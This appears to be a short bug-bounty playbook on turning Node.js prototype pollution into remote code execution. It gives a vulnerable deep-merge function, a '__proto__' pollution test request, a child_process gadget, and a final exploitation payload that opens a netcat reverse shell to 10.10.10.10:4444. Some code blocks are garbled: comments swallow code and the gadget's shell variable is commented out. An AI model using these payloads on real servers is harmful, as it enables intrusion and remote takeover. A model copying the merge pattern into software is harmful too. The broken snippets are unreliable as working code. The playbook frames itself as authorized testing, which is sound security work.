# Prototype Pollution to RCE (Node.js)

## When to Use
- When auditing JavaScript (client-side) or Node.js (server-side) applications that perform deep merging, cloning, or path assignment on user-controlled JSON data.
- To escalate a seemingly minor logic flaw (modifying object properties) into full Remote Code Execution on the backend server.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying the Pollution Vector (Sink)

```javascript
# Concept: Deep Merge const merge = (target, source) => {
    for (let attr in source) {
        if (typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
            merge(target[attr], source[attr]); // VULNERABLE } else {
            target[attr] = source[attr];
        }
    }
    return target;
};
```

### Phase 2: Testing for Pollution

```http
# POST /api/settings HTTP/1.1
Content-Type: application/json

{"__proto__": {"isAdmin": true}}

# ```

### Phase 3: Finding a Gadget (Path to RCE)

```javascript
# const { execSync } = require('child_process');

function executeCommand(opts) {
    // let shell = opts.shell || '/bin/sh'; 
    execSync('echo hello', { shell: shell });
}
```

### Phase 4: Exploitation (Polluting the Gadget)

```http
# POST /api/settings HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "shell": "node -e 'require(\"child_process\").execSync(\"nc -e /bin/sh 10.10.10.10 4444\")'"
  }
}
```
